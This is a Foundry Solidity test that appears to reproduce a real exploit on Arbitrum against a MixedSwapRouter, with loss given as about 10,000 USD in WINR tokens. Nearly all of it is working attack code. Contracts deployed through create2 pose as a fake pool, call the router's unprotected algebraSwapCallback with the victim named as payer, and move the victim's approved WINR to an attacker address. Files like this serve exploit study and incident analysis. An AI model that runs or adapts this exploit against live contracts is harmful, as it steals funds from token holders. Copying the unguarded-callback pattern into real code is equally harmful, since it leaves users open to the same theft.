// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import ".././interface.sol";

// @KeyInfo - Total Lost : Lost: =>10000 USD(WINR tokens)
// TX : https://app.blocksec.com/explorer/tx/arbitrum/0xf57f041cb6d8a10e11edab50b84e49b59ff834c7d114d1e049cedd654c36194d

// Attacker :https://arbiscan.io/address/0xfeef112831cc8f790abe71b4b196c220ee26ecf3
// Attack Contract :https://arbiscan.io/address/0x4fba400b95cd9e3d7e4073ad6e6bbaf41e640cdf
// Vulnerable Contract :https://arbiscan.io/address/0x58637aaac44e2a2f190d9e1976e236d86d691542

// @Analysis
// https://x.com/ChainAegis/status/1796484286738227579

interface MixedSwapRouter{
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMin;
        address[] pool;
    }
    struct SwapCallbackData {
        bytes path;
        address payer;
        address pool;
    }
    function swapTokensForTokens(ExactInputParams memory params) external;
    function algebraSwapCallback(
        int256 amount0,
        int256 amount1,
        bytes calldata data
    ) external;
}
contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 WINR = IERC20(0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E);
    address owner;
    address victim=0xb6d566c4d645ab640fc6Ac362f233dCFB5621f7C;
    MixedSwapRouter Swaprouter=MixedSwapRouter(0xE3E98241CB99AF7a452e94B9cf219aAa766e0869);
    function setUp() external {
        cheats.createSelectFork("arbitrum", 216881055);
    }
    function testExploit() external {
        attack();
    }
    function attack() internal {
        address one=create_contract(1);
    }

    function cal_address(uint256 time) internal returns(address){
        bytes memory bytecode = type(Exploit).creationCode;
        uint256 _salt = time;
        bytecode = abi.encodePacked(bytecode);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        address hack_contract =  address(uint160(uint256(hash)));
        return hack_contract;
    }
    function create_contract(uint256 times) internal returns(address) {
        uint256 i = 0;
        while(i<times){
            bytes memory bytecode = type(Exploit).creationCode;
            uint256 _salt = i;
            bytecode = abi.encodePacked(bytecode);
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
            address hack_contract =  address(uint160(uint256(hash)));
            address addr;
            // Use create2 to send money first.
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            }
            i ++;
            return hack_contract;

        }
    }
function receive() public payable {}
}
contract Exploit is Test{
    IERC20 WINR = IERC20(0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E);
    address owner;
    MixedSwapRouter Swaprouter=MixedSwapRouter(0xE3E98241CB99AF7a452e94B9cf219aAa766e0869);
    constructor() {
        owner = msg.sender;
        attacks();
    }
    function attacks() internal {
        address two=create_contract(2);
        address[] memory pools=new address[](1);
        pools[0]=address(two);
        MixedSwapRouter.ExactInputParams memory pgs = MixedSwapRouter
            .ExactInputParams({
                path: hex"d77b108d4f6cefaa0cae9506a934e825becca46e000000d77b108d4f6cefaa0cae9506a934e825becca46e",
                recipient: address(this),
                deadline: block.timestamp + 1000,
                amountIn: 10,
                amountOutMin: 10,
                pool: pools
            });
        Swaprouter.swapTokensForTokens(pgs);

    }
    function create_contract(uint256 times) internal returns(address) {
        uint256 i = 0;
        while(i<times){
            bytes memory bytecode = type(Moneys).creationCode;
            uint256 _salt = i;
            bytecode = abi.encodePacked(bytecode);
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
            address hack_contract =  address(uint160(uint256(hash)));
            address addr;
            // Use create2 to send money first.
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            }
            i ++;
            return hack_contract;

        }
    }
    fallback() external payable {}
}
contract Moneys is Test{
    IERC20 WINR = IERC20(0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E);
    address owner;
    address Victim=0xb6d566c4d645ab640fc6Ac362f233dCFB5621f7C;
    MixedSwapRouter Swaprouter=MixedSwapRouter(0xE3E98241CB99AF7a452e94B9cf219aAa766e0869);
    //Example/Attacker's address
    address test=0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;
    event data(bytes data);
    constructor() {
        owner = msg.sender;
    }
    function fee()public returns(uint256){
            return 0;
    }
    function token0()public returns(address){
        return address(WINR);
    }
    function token1()public returns(address){
        return address(WINR);
    }
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) public returns(uint256,uint256) {
        emit log_named_decimal_uint("Vicitm WINR balance before exploit", WINR.balanceOf(address(Victim)), 18);
        emit log_named_decimal_uint("Attacker WINR balance before exploit", WINR.balanceOf(address(this)), 18);
        MixedSwapRouter.SwapCallbackData memory Params = MixedSwapRouter
            .SwapCallbackData({
                path: hex"d77b108d4f6cefaa0cae9506a934e825becca46e000000d77b108d4f6cefaa0cae9506a934e825becca46e",
                payer: address(Victim),
                pool: address(this)
            });
        bytes memory encodedParams = abi.encode(Params);
        Swaprouter.algebraSwapCallback(-20057735863910611438,293182421809175367609122,encodedParams);
        emit log_named_decimal_uint("Vicitm WINR balance after exploit", WINR.balanceOf(address(Victim)), 18);
        emit log_named_decimal_uint("Attacker WINR balance after exploit", WINR.balanceOf(address(this)), 18);
        WINR.transfer(address(test),WINR.balanceOf(address(this)));
        return (10,10);    

    }

 
}
